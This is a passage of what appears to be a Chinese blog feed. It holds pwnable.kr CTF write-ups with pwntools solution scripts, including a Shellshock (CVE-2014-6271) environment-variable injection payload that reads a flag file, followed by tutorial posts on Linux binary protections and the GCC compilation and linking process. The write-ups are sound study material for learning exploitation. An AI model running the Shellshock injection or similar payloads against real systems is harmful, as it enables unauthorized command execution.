class="comment">#argv[&#x27;A&#x27;]=&#x27;x00&#x27;</span></span><br><span class="line"><span class="comment">#argv[&#x27;B&#x27;]=&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">argc = <span class="built_in">list</span>(<span class="string">&#x27;A&#x27;</span>) * <span class="number">100</span></span><br><span class="line">argc[<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">argc[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">b&#x27;\x20\x0a\x0d&#x27;</span> </span><br><span class="line"><span class="comment">#set socket port</span></span><br><span class="line">argc[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&quot;5555&quot;</span></span><br><span class="line">argc[<span class="number">0</span>] = <span class="string">&#x27;/home/input2/input&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">stdin_r, stdin_w = os.pipe()</span><br><span class="line">stderr_r, stderr_w = os.pipe()</span><br><span class="line">os.write(stdin_w, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">os.write(stderr_w, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">environ = &#123;<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span> : <span class="string">b&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">b&#x27;\x0a&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sh = subprocess.Popen(argc, stdin = stdin_r, stderr = stderr_r, env = environ)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">5555</span>))</span><br><span class="line">s.send(<span class="string">b&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>另外一个Tips：</strong></p><p>t权限（粘着位SBIT）：任何人在该目录下有写权限，但是普通用户不能删除别人的文件</p><p>查看到tmp目录下普通用户有-wt权限，我们进入tmp目录后创建自己的一个目录然后执行a.py</p><p>注意到当前目录下并没有flag，我们需要创建软连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln /home/input/flag flag</span><br></pre></td></tr></table></figure><h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><p><strong>ARM汇编：</strong></p><p>这篇一步到位。<a href="https://azeria-labs.com/arm-instruction-set-part-3/">点我</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;: mov r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:    mov r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:    bx  lr</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.返回值存储在r0寄存器</p><p>ARM处理器有两种工作状态：ARM状态和Thumb状态。处理器可以在两种状态下随意切换。</p><p>处于ARM状态时，执行32位字对齐的ARM指令。</p><p>处于Thumb状态时，执行16位对齐的Thumb指令。</p><p>2.两种工作状态：</p><p>ARM 和 Thumb 指令集的动态切换，是通过 BX 指令使用一个寄存器名作为参数来完成。<br>程序控制权被转交给该寄存器中存储的地址 ( LSB 位被屏蔽 )。</p><p>如果 LSB=1, 则进入 Thumb 指令处理模式； 如果 LSB=0, 则进入 ARM 指令处理模式。</p><p>通俗点讲其实就是BX 跳转的地址最低位为1还是0来判断是进入Thumb指令处理模式还是进人ARM指令处理模式</p><p>3.Thumb模式下PC值=当前指令地址值+8</p><p>key1=0x00008cdc+8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:    push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:    bx    r6           ;此时r6最后一位是1,进入ARM thumb模式 pc&#x3D;adress+4</span><br><span class="line">   0x00008d04 &lt;+20&gt;:    mov    r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:    pop    &#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:    pop    &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>这里返回值由r3传入。然后再看一下地址  0x00008d00 &lt;+16&gt;这里，有个bx r6，而r6等于pc+1即0x8d05，最低为为1，所以执行bx r6之后会进入thumb模式，这样就会变成2字节对齐，pc存储着当前指令加4的位置，如此一来，下面的mov r3,pc中，r3等于0x8d04+0x4。下一条为adds r3，#4，表示r3 = r3 + 4后更新标志位，因此r3 = 0x8d04 + 0x4 + 0x4。</p><p>key2=0x8d04 + 0x4 + 0x4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;: push    &#123;r11&#125;       ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;: add r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;: mov r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:    mov r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:    sub sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:    pop &#123;r11&#125;       ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:    bx  lr</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终key3=lr的值</p><p>lr寄存器也即R14寄存器，用作子程序链接，称为链接寄存器LK (Link Register)。</p><p>作用：使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回</p><p>在main函数找到调用key时的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:movr3, r0</span><br></pre></td></tr></table></figure><p>BL指令：</p><p>B或BL指令引起处理器转移到“子程序名”处开始执行。<br>两者的不同之处在于:<br>(1)BL指令在转移到子程序执行之前，将其下一条指令的地址拷贝到R14（LR,链接寄存器）。<br>   由于BL指令保存了下条指令的地址，因此使用指令“MOV PC ,LR”即可实现子程序的返回。<br>(2)B指令则无法实现子程序的返回，只能实现单纯的跳转。用户在编程的时候，可根据具体应用选用合适的子程序调用语句。</p><p>key3=0x8d80</p><p>三个数相加即可 </p><p>Exp:  108400</p><h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>符号优先级相关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>比较运算符优先级高于赋值运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对，而另一方面，0作为文件描述符，它指向的是stdin。</p><p>两个输入都由我们构造，自由发挥即可。。</p><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;mistake&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">sh=shell.run(<span class="string">&#x27;./mistake&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;B&#x27;</span>*<span class="number">10</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;do not bruteforce...\n&quot;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;C&#x27;</span>*<span class="number">10</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;input password : &quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>CVE-2014-6271（破壳漏洞）面向Google解题</p><p><a href="https://blog.csdn.net/tinyletero/article/details/40261593">Link</a></p><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;shellshock&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">sh=shell.run(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;env x=&#x27;() &#123; :;&#125;; bash -c \&quot;cat flag\&quot; &#x27; ./shellshock&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><h2 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h2><h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><h2 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h2><h2 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h2><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h2 id="blukat"><a href="#blukat" class="headerlink" title="blukat"></a>blukat</h2><h2 id="horcruxes"><a href="#horcruxes" class="headerlink" title="horcruxes"></a>horcruxes</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-games&quot;&gt;&lt;a href=&quot;#Pwnable-games&quot; class=&quot;headerlink&quot; title=&quot;Pwnable_games&quot;&gt;&lt;/a&gt;Pwnable_games&lt;/h1&gt;&lt;p&gt;开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp&lt;</summary>
      
    
    
    
    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux程序保护机制</title>
    <link href="http://example.com/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2021-04-17T18:32:31.798Z</published>
    <updated>2021-04-17T18:48:23.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux程序保护机制"><a href="#Linux程序保护机制" class="headerlink" title="Linux程序保护机制"></a>Linux程序保护机制</h1><p>​    在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:)</p><h2 id="Tools-checksec"><a href="#Tools-checksec" class="headerlink" title="Tools:checksec"></a>Tools:checksec</h2><p>checksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo:  题目:flag</p><p><img src="https://i.loli.net/2021/04/18/kOGJRsePqZuj2AM.png" alt="图片.png"></p><p>下面对逐个介绍保护机制</p><h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>​    在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。</p><p>​    Function：</p><p>1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作<br>“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。</p><p>2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。</p><p>3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。</p><p>4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。</p><p>5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。</p><p><img src="https://i.loli.net/2021/04/18/InOpchLTMduiEj6.png" alt="6.png"></p><p><img src="https://i.loli.net/2021/04/18/oFnTNEWy9baQixr.png" alt="7.jpg"></p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>FORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。</p><p>在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。</p><p>gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度</p><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX:no-excute不可执行</p><p>基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p><img src="https://i.loli.net/2021/04/18/phJd1xmej7unXZE.png" alt="8.jpg"></p><h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作</p><h2 id="内存地址随机化机制几种情况："><a href="#内存地址随机化机制几种情况：" class="headerlink" title="内存地址随机化机制几种情况："></a>内存地址随机化机制几种情况：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO:read only relocation </p><p>由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>了解以上内存保护机制的信息会为我们pwn提供一些信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux程序保护机制&quot;&gt;&lt;a href=&quot;#Linux程序保护机制&quot; class=&quot;headerlink&quot; title=&quot;Linux程序保护机制&quot;&gt;&lt;/a&gt;Linux程序保护机制&lt;/h1&gt;&lt;p&gt;​    在Pwnable.kr刷题的过程中一点一点地了解了linu</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
    <category term="程序保护机制" scheme="http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
    <category term="Pwn" scheme="http://example.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux代码编译过程</title>
    <link href="http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
    <id>http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</id>
    <published>2021-04-11T16:05:33.539Z</published>
    <updated>2021-04-11T16:05:11.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux下Hello-World的前生今世"><a href="#Linux下Hello-World的前生今世" class="headerlink" title="Linux下Hello World的前生今世"></a>Linux下Hello World的前生今世</h1><h2 id="代码引入"><a href="#代码引入" class="headerlink" title="代码引入"></a>代码引入</h2><p>hello.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[],<span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>linux环境下我们可以通过GCC编译hello.c:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -g hello.c -o hello</span><br></pre></td></tr></table></figure><p>当前目录先会生成hello可执行文件。</p><h3 id="main函数的三个参数"><a href="#main函数的三个参数" class="headerlink" title="main函数的三个参数"></a>main函数的三个参数</h3><p>int argc</p><p>int型变量，表示传递给main函数的参数数量。</p><p>char *argv</p><p>指针数组，每个指针指向各个具体的参数。</p><p>char*envp</p><p>环境变量，可以为程序运行过程中需要使用环境变量做参考。</p><p>Demo:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello   //执行该文件</span><br></pre></td></tr></table></figure><p>此时argc=1,表示只有一个参数输入</p><p>argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello para_1</span><br></pre></td></tr></table></figure><p>此时argc=2,有两个参数传入</p><p>argc[0]指向输入程序路径及名称 “./hello”</p><p>argv[1]指向para_1字符串</p><h3 id="what’s-gcc"><a href="#what’s-gcc" class="headerlink" title="what’s gcc"></a>what’s gcc</h3><p>GCC是GNU Compiler Collection的缩写，GCC是一系列编译器的集合，是Linux操作系统的核心组件之一。GCC最初名为GNU C Compiler，当时它只是一款C语言的编译器，不过随着后续迭代，它支持C++、Fortran、Go等语言，GCC也因此成为一个编译器集合。GCC有以下特点：</p><ul><li><p>GCC支持的编程语言多。比如，<code>g++</code>是C++编译器，<code>gfortran</code>是Fortran编译器。</p></li><li><p>GCC支持的硬件全。GCC可以将源代码编译成x86_64、ARM、PowerPC等硬件架构平台的可执行文件。</p></li><li><p>GCC支持众多业界标准。GCC能很快支持最新的C++标准，GCC支持OpenMP、OpenACC。</p></li></ul><h2 id="编译过程分析"><a href="#编译过程分析" class="headerlink" title="编译过程分析"></a>编译过程分析</h2><p><img src="https://i.loli.net/2021/04/09/6Mdc9ytguaYkOZ4.png" alt="linux编译过程.png"></p><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理器CPP工具进行预处理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cpp hello.c -o hello.i</span><br></pre></td></tr></table></figure><p>预编译主要处理源代码中以<code>#</code>开始的预编译指令，主要处理规则如下：</p><ul><li>处理<code>#include</code>预编译指令，将被包含的文件插入到该预编译指令的位置。这是一个递归的过程，如果被包含的文件还包含了其他文件，会递归地完成这个过程。</li><li>处理条件预编译指令，比如<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code>。</li><li>删除<code>#define</code>，展开所有宏定义。</li><li>添加行号和文件名标识，以便于在编译过程中产生编译错误或者调试时都能够生成行号信息。</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>gcc对预处理后的hello.i文件惊醒编译。编译的过程主要是进行词法分析、语法分析、语义分析，这背后涉及编译原理等一些内容。这里只进行编译，不汇编，可以生成硬件平台相关的汇编语言。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><p>它包含一个汇编语言程序，即将C语言程序编译成汇编语言程序。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>as工具将hello.s文件翻译为二进制代码。</p><p>虽然这个文件已经是二进制的机器码了，但是它仍然不能执行，因为它缺少系统运行所必须的库，比如C语言<code>printf()</code>对应的汇编语言的<code>puts</code>函数。确切的说，系统还不知道<code>puts</code>函数在内存中的具体位置。如果我们在一份源代码中使用了外部的函数或者变量，还需要重要的一步：链接。</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc hello.o -o hello</span><br></pre></td></tr></table></figure><p>该命令是基于<strong>动态链接</strong>的方式，生成的<code>hello</code>已经是一个可执行文件。实际上，这个命令隐藏了很多背后的内容。</p><p><code>main()</code>方法是C语言程序的入口，<code>crt1.o</code>这几个库是在处理<code>main()</code>方法调用之前和程序退出之后的事情，这需要与操作系统协作。在Linux中，一个新的程序都是由父进程调用<code>fork()</code>，生成一个子进程，然后再调用<code>execve()</code>，将可执行文件加载进来，才能被操作系统执行。所以，准确地说，<code>main()</code>方法是这个程序的入口，但仅仅从<code>main()</code>方法开始，并不能顺利执行这个程序。</p><p>链接器将多个目标文件合并成一个可执行目标文件，这个二进制文件包含加载程序到内存并运行的所有信息。</p><p>链接过程主要包含了两个步骤：</p><ol><li><p><strong>地址与空间分配（Address and Storage Allocation）</strong></p><p>这个过程中， 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。</p><p>这里引入可执行目标文件的概念。</p><p><img src="https://i.loli.net/2021/04/10/rPaJSl5UQHMc16s.png" alt="EOF.png"></p></li></ol><p>   .text:已编译程序的机器代码</p><p>   .rodata:只读数据</p><p>   .data:已初始化的全局和静态C变量</p><p>   .bss:未初始化的全局和静态C变量</p><p>   .symtab: 符号表，存放在程序中定义和引用的函数和全局变量的信息</p><p>   .debug:调试符号表</p><p>   可执行文件中的段是由目标文件中的节合并而来的，以下是链接器如何将它们的各个节合并到输出文件，也即输出文件中的空间如何分配给输入文件的两种方式。</p><p>   <strong>顺序叠加</strong></p><p>   <img src="https://i.loli.net/2021/04/10/s5acwxbHEJCvldq.png" alt="elf2.png"></p><p>   虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86硬件的对齐要求是4KB。如果一个节的大小只有1个字节，它也要在内存在重用4KB。这样会造成大量内部碎片。所以不是一个好的方案。</p><p>   <strong>合并相似节</strong></p><p>   一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 <strong><code>.text</code>节</strong>合并到输出文件的 <strong><code>text</code>段</strong>（注意，此时出现了段和节两个概念），如下图所示。</p><p>   <img src="https://i.loli.net/2021/04/10/4gsBqv7fHbFXjMT.png" alt="elf1.png"></p><p>   其中<code>.bss</code>节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的<strong>空间和地址</strong>有两层含义:</p><ol><li>在输出的可执行文件中的空间</li><li><p>在装载后的虚拟地址中的空间</p><p>对于有实际数据的节，如<code>.text</code>和<code>.data</code>，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于<code>.bss</code>来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。<strong>我们在这里谈到的空间分配只关注于虚拟地址空间（见下图）的分配</strong>，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。</p><p><img src="https://i.loli.net/2021/04/10/FP4Nlwm1QWxpgzs.png" alt="dizhi.png"></p><p>现在的链接器空间分配的策略基本上都采用“合并相似节”的方法，使用这种方法的链接器一般采用一种叫 <strong>两步链接（Two-pass Linking）</strong> 的方法。即整个链接过程分为地址与空间分配和符号解析、重定位。</p></li></ol><ol><li><p><strong>符号解析（Symbol Resolution）</strong>和<strong>重定位（Relocation）</strong></p><p>使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。重定位是链接过程的核心。在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 <strong>程序头表（Program Header Table）</strong> 结构。如下图可执行文件结构所示，主要生成两个段：代码段（ <code>text</code>段）、数据段（ <code>data</code>段 ）。</p></li></ol><p>   <img src="https://i.loli.net/2021/04/10/JASN3iGExlVrhv8.png" alt="different-elf-type.png"></p><p>   <img src="https://i.loli.net/2021/04/10/4gsBqv7fHbFXjMT.png" alt="elf1.png"></p><p>   <strong>符号解析</strong></p><p>   重定位的过程是伴随着符号解析的，这里先介绍符号解析。</p><p>   